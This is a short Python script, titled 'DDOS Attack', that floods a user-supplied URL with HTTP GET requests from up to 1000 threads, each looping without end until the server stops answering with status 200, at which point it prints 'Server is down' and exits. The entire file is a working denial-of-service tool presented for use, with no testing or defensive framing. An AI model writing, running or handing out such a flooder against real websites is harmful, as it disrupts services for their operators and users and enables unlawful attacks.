import argparse
import threading
import sys
import requests
import os

# Initialize the parser
parser = argparse.ArgumentParser(description="DDOS Attack")
parser.add_argument("target_url", help="url attack to ", type=str)
parser.add_argument("num_of_threads",
                    help="number of threading for DDOSmust be greater than 1",
                    type=int,
                    nargs="?",
                    default=1000)

# Parse the arguments 
args = parser.parse_args()

# hundle the error a case of invalid URL
try:
    req_to_server=requests.get(args.target_url)
except requests.exceptions.MissingSchema:
    print("Invalid URL")
    sys.exit(0)
    
if args.num_of_threads <= 0:
    print(f"{args.num_of_threads} must be a positive number")
    sys.exit(0)

threads = []

# reqs function to send requests to the server
def reqs():
    while True:
       req_to_url= requests.get(args.target_url)
      
       if req_to_url.status_code != 200:
           print("Server is down")
          
           os._exit(0)
               
def attack():
    for i in range(args.num_of_threads):
        thread = threading.Thread(target=reqs)

        thread.start()
        threads.append(thread)
        print(f" {i+1} number of reqs send to {args.target_url} and the status code is {req_to_server.status_code}")
        if i == args.num_of_threads - 1:
            print("Done!")

    for thread in threads:
        thread.join()


attack()
